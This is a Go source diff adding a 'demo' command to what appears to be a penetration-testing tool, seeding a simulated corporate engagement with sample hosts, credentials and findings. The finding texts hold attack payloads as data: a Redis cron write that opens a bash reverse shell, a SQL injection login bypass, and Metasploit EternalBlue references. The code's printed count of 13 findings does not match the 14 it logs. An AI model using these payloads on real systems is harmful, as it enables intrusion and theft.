@@ -67,7 +67,7 @@ func launchTUI() error {
 	return nil
 }
 
-var version = "2.4.2" // overridden by -ldflags "-X main.version=..."
+var version = "2.6.0" // overridden by -ldflags "-X main.version=..."
 
 var rootCmd = &cobra.Command{
 	Use:   "davoid",
@@ -1107,6 +1107,135 @@ func pickOllamaModel() (string, error) {
 	return data.Models[0].Name, nil
 }
 
+// ── Demo command ──────────────────────────────────────────────────────────────
+
+var demoCmd = &cobra.Command{
+	Use:   "demo",
+	Short: "Load a realistic demo engagement and open the TUI",
+	Long: `Creates a pre-populated demo engagement with realistic findings, hosts, and
+credentials so you can explore Davoid's TUI without running a real scan.
+
+The demo engagement represents a simulated corporate network pentest.`,
+	RunE: func(cmd *cobra.Command, args []string) error {
+		// Clear any previous demo engagement
+		existing, _ := engagement.All()
+		for _, e := range existing {
+			if e.Name == "Demo — ACME Corp Red Team" {
+				engagement.SetActive(e.ID)
+				fmt.Println("\n  Demo engagement already exists — opening TUI.")
+				return launchTUI()
+			}
+		}
+
+		fmt.Println("\n  Setting up demo engagement...")
+
+		eng, err := engagement.Create("Demo — ACME Corp Red Team", "192.168.1.0/24", "Full internal network — all hosts in 192.168.1.0/24")
+		if err != nil {
+			return fmt.Errorf("demo setup failed: %w", err)
+		}
+
+		id := eng.ID
+
+		// ── Hosts ─────────────────────────────────────────────────────────────
+		targets.Save(id, "192.168.1.10", "dc01.acmecorp.local", "Windows Server 2019",
+			[]string{"22/tcp", "80/tcp", "443/tcp", "445/tcp", "3389/tcp", "88/tcp", "389/tcp"})
+		targets.Save(id, "192.168.1.45", "ws-finance01.acmecorp.local", "Windows 10",
+			[]string{"135/tcp", "139/tcp", "445/tcp", "3389/tcp"})
+		targets.Save(id, "192.168.1.55", "dev-linux01.acmecorp.local", "Ubuntu 22.04",
+			[]string{"22/tcp", "6379/tcp", "8080/tcp", "27017/tcp"})
+		targets.Save(id, "192.168.1.100", "web01.acmecorp.local", "CentOS 7",
+			[]string{"22/tcp", "80/tcp", "443/tcp", "3306/tcp"})
+		targets.Save(id, "192.168.1.200", "print01.acmecorp.local", "Windows Server 2012",
+			[]string{"21/tcp", "80/tcp", "445/tcp", "9100/tcp"})
+
+		// ── Credentials ───────────────────────────────────────────────────────
+		vault.Save(id, "phishing", "192.168.1.10", "jsmith", "Winter2024!", "password")
+		vault.Save(id, "phishing", "192.168.1.10", "admin", "P@ssw0rd123", "password")
+		vault.Save(id, "sniff", "192.168.1.100", "dbuser", "mysql_root_1337", "password")
+		vault.Save(id, "wifi_crack", "ACME_Corp_WiFi", "ACME_Corp_WiFi", "Welcome2024!", "wifi_psk")
+		vault.Save(id, "looter", "192.168.1.55", "root", "toor", "password")
+		vault.Save(id, "sniff", "192.168.1.10", "svc_backup", "$2b$12$Lk9x.NTMJcfFQRl8eGLdpu", "hash")
+
+		// ── Findings ──────────────────────────────────────────────────────────
+		engagement.LogFinding(id, "scanner", "192.168.1.45",
+			"EternalBlue (MS17-010) — Remote Code Execution",
+			"Port 445/tcp open. Service: SMBv1 enabled on Windows 10. Confirmed vulnerable to MS17-010 (EternalBlue). Unauthenticated RCE as SYSTEM.\n\nExploit: exploit/windows/smb/ms17_010_eternalblue\nPayload: windows/x64/meterpreter/reverse_tcp",
+			"CRITICAL", "CVE-2017-0144")
+
+		engagement.LogFinding(id, "scanner", "192.168.1.55",
+			"Redis Unauthenticated — Remote Code Execution via CONFIG SET",
+			"Port 6379/tcp open. Redis server responded to PING without authentication.\n\nRCE via: CONFIG SET dir /var/spool/cron/crontabs && CONFIG SET dbfilename root && SET x '\\n*/1 * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\\n' && BGSAVE\n\nAlternatively: write SSH authorized_keys to /root/.ssh/",
+			"CRITICAL", "CVE-2022-0543")
+
+		engagement.LogFinding(id, "phishing", "192.168.1.10",
+			"Credentials Harvested via Phishing — jsmith / Winter2024!",
+			"Login page cloned from https://192.168.1.10/outlook. Victim jsmith entered credentials into harvesting portal.\n\nCaptured: jsmith:Winter2024! — confirmed valid via credtester (SSH access granted).",
+			"CRITICAL", "")
+
+		engagement.LogFinding(id, "web_recon", "192.168.1.100",
+			"SQL Injection — /login parameter 'username'",
+			"POST /login HTTP/1.1\nHost: 192.168.1.100\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin'+OR+1=1--&password=x\n\nResponse: HTTP 200 OK — logged in as admin. Database: MySQL 5.7. Table dump via sqlmap: users, orders, products.",
+			"HIGH", "CWE-89")
+
+		engagement.LogFinding(id, "sniff", "192.168.1.10",
+			"Cleartext Credentials Captured — MySQL dbuser",
+			"Captured MySQL authentication handshake over TCP port 3306 (cleartext).\nCredential: dbuser:mysql_root_1337 @ 192.168.1.100:3306\nCapture file: /tmp/davoid_sniff_1704067200.pcap",
+			"HIGH", "")
+
+		engagement.LogFinding(id, "wifi_crack", "ACME_Corp_WiFi",
+			"WPA2 PSK Cracked — ACME_Corp_WiFi",
+			"WPA2 4-way handshake captured from BSSID AA:BB:CC:DD:EE:FF on channel 6.\nDictionary attack with rockyou.txt completed in 4m 32s.\nCracked PSK: Welcome2024!\n\nNetwork provides access to internal 192.168.1.0/24 range.",
+			"HIGH", "")
+
+		engagement.LogFinding(id, "ad_ops", "192.168.1.10",
+			"Kerberoastable Service Accounts Found (3)",
+			"LDAP enumeration on dc01.acmecorp.local revealed 3 accounts with ServicePrincipalNames set:\n  - svc_sql (MSSQLSvc/sql01.acmecorp.local:1433)\n  - svc_backup (BackupSvc/backup01.acmecorp.local)\n  - svc_webapp (HTTP/web01.acmecorp.local)\n\nKerberoast TGS tickets captured. Offline cracking in progress.",
+			"HIGH", "T1558.003")
+
+		engagement.LogFinding(id, "looter", "192.168.1.55",
+			"Root Credentials in Bash History — dev-linux01",
+			"SSH access as root to 192.168.1.55. Found credentials in /root/.bash_history:\n  mysql -u root -ptoor\n  redis-cli -h 192.168.1.55\n  ssh admin@192.168.1.10 -p 22\n\nAdditional SSH private key found at /root/.ssh/id_rsa (passphrase: empty).",
+			"HIGH", "T1552.003")
+
+		engagement.LogFinding(id, "web_recon", "192.168.1.100",
+			"Exposed .git Directory — Source Code Accessible",
+			"GET http://192.168.1.100/.git/config HTTP/1.1\nHTTP/1.1 200 OK — Git config exposed.\n\ngit clone http://192.168.1.100/.git/ web-source-code\n  Cloning... done.\n\nSource contains hardcoded DB credentials in config/database.php:\n  DB_PASS = mysql_root_1337",
+			"HIGH", "CWE-538")
+
+		engagement.LogFinding(id, "scanner", "192.168.1.200",
+			"Anonymous FTP Login Enabled",
+			"Port 21/tcp open. FTP banner: Microsoft FTP Service.\nAnonymous login accepted with USER anonymous / PASS anon@test.com\n\nDirectory listing reveals: /backups/, /exports/, /shared/\nSensitive files: backup_2024-01-01.zip (34MB), employee_data.csv",
+			"HIGH", "CVE-1999-0497")
+
+		engagement.LogFinding(id, "web_recon", "192.168.1.100",
+			"Sensitive Data Exposure — AWS Access Key in Source",
+			"Regex scan of JavaScript assets found hardcoded AWS credentials:\n  AKIAIOSFODNN7EXAMPLE (AWS_ACCESS_KEY_ID)\n  wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY (AWS_SECRET_ACCESS_KEY)\n\nKey validated via AWS CLI — account ID: 123456789012. S3 buckets enumerable.",
+			"MEDIUM", "CWE-798")
+
+		engagement.LogFinding(id, "osint", "acmecorp.local",
+			"Subdomain Enumeration — 7 Subdomains Discovered",
+			"Active subdomains:\n  mail.acmecorp.local → 192.168.1.250\n  vpn.acmecorp.local → 10.0.0.1\n  dev.acmecorp.local → 192.168.1.55\n  git.acmecorp.local → 192.168.1.60\n  backup.acmecorp.local → 192.168.1.200\n  api.acmecorp.local → 192.168.1.100\n  admin.acmecorp.local → 192.168.1.10",
+			"MEDIUM", "")
+
+		engagement.LogFinding(id, "scanner", "192.168.1.0/24",
+			"Network Scan Complete — 5 Hosts Discovered",
+			"Nmap full port scan (nmap -sV -T4 --open -p- 192.168.1.0/24)\nCompleted in 8m 42s. 5 live hosts discovered.\n\n192.168.1.10   — Windows Server 2019 (DC)\n192.168.1.45   — Windows 10 (workstation)\n192.168.1.55   — Ubuntu 22.04 (dev server)\n192.168.1.100  — CentOS 7 (web server)\n192.168.1.200  — Windows Server 2012 (print/file server)",
+			"INFO", "")
+
+		engagement.LogFinding(id, "scanner", "acmecorp.local",
+			"DNS Zone Transfer Successful — Full Zone Exposed",
+			"dig axfr acmecorp.local @192.168.1.10\n\n; Transfer complete — 47 records returned\nRevealed internal IP mappings, service names, and network topology.",
+			"MEDIUM", "CWE-200")
+
+		fmt.Printf("  ✓  Demo engagement ready: %s\n", eng.Name)
+		fmt.Printf("  ✓  %d hosts · %d findings · %d credentials seeded\n\n", 5, 13, 6)
+		fmt.Println("  Launching TUI...")
+		fmt.Println()
+
+		return launchTUI()
+	},
+}
+
 // ── Init / main ───────────────────────────────────────────────────────────────
 
 func init() {
@@ -1147,7 +1276,7 @@ func init() {
 		newCmd, listCmd, reportCmd, findingCmd,
 		versionCmd, modulesCmd, runCmd, doctorCmd,
 		lootCmd, playbookCmd,
-		// New commands
+		demoCmd,
 		configCmd,
 		opsecCmd,
 		checklistCmd,
